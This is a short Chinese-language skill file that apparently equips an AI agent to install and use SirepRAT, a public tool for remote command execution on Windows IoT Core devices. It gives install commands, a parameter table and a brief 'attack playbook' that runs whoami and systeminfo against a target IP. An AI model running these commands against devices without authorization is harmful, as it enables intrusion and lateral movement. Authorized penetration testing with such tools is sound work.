---
name: sireprat-windows-iot
description: 渗透工具 skill:SirepRAT 的安装、参数速查与攻击场景 playbook。当任务涉及 远程服务横向移动 需要调用 SirepRAT 时使用。
---

# SirepRAT

- 攻击大类:C31 远程服务横向移动
- 上游仓库:https://github.com/SafeBreach-Labs/SirepRAT
- 上游 License:BSD-3-Clause(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/SafeBreach-Labs/SirepRAT && cd SirepRAT && pip install -r requirements.txt
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python SirepRAT.py 10.0.0.5 LaunchCommandWithOutput -c 'cmd /c whoami'` | Windows IoT RCE |
| `-c 'cmd /c dir'` | 命令 |
| `-f file` | 上传 |

## 攻击场景 Playbook

### Windows IoT 设备 RCE

```bash
python SirepRAT.py 10.0.0.5 LaunchCommandWithOutput -c 'cmd /c systeminfo'
# Sirep 协议 RCE
```

## 注意事项

SafeBreach 出品,Windows IoT Core RCE。
